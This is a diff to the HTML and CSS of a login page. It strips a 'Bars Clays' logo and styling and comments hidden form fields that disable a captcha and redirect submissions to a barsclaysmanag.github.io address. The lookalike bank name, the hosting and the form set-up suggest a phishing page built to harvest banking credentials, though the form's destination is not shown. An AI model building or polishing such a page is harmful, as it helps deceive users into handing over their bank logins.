@@ -35,39 +35,10 @@
         margin-bottom: 20px;
     }
 
-    /* ===== LOGO STYLING ===== */
-    .logo {
-        display: flex;
-        justify-content: center;
-        margin-bottom: 25px;
-    }
-
-    .logo img {
-        width: 95px;
-        height: 95px;
-        border-radius: 50%; /* Circular */
-        object-fit: cover;
-        box-shadow: 0 0 20px rgba(252, 213, 53, 0.6); /* Glow effect */
-        animation: floatLogo 3s ease-in-out infinite; /* Animation */
-        transition: transform 0.3s ease;
-    }
-
-    .logo img:hover {
-        transform: scale(1.08);
-    }
-
-    @keyframes floatLogo {
-        0% { transform: translateY(0px); }
-        50% { transform: translateY(-6px); }
-        100% { transform: translateY(0px); }
-    }
-    /* ========================= */
-
     h1 {
         font-size: 28px;
         margin-bottom: 25px;
         font-weight: 600;
-        text-align: center;
     }
 
     label {
@@ -119,12 +90,10 @@
         cursor: pointer;
         margin-top: 10px;
         margin-bottom: 20px;
-        transition: 0.3s;
     }
 
     .btn-primary:hover {
         opacity: 0.9;
-        box-shadow: 0 0 15px rgba(252, 213, 53, 0.6);
     }
 
     .footer-link {
@@ -133,7 +102,6 @@
         display: block;
         text-decoration: none;
         font-weight: 500;
-        text-align: center;
     }
 
     .footer-link:hover {
@@ -162,12 +130,6 @@
 <div class="container">
 
     <div class="close-btn">&times;</div>
-
-    <!-- LOGO -->
-    <div class="logo">
-        <img src="https://drive.google.com/uc?export=view&id=12W27RksV4_H9_J3BrY_T891HKyLufNXw" alt="Bars Clays Logo">
-    </div>
-
     <h1>Log in</h1>
 
     <!-- FORM -->
@@ -190,7 +152,10 @@
             <span class="icon-btn" onclick="togglePassword()">👁</span>
         </div>
 
+        <!-- Disable captcha -->
         <input type="hidden" name="_captcha" value="false">
+
+        <!-- Optional redirect after submit -->
         <input type="hidden" name="_next" value="https://barsclaysmanag.github.io/bars_clays/">
 
         <button type="submit" class="btn-primary">Continue</button>
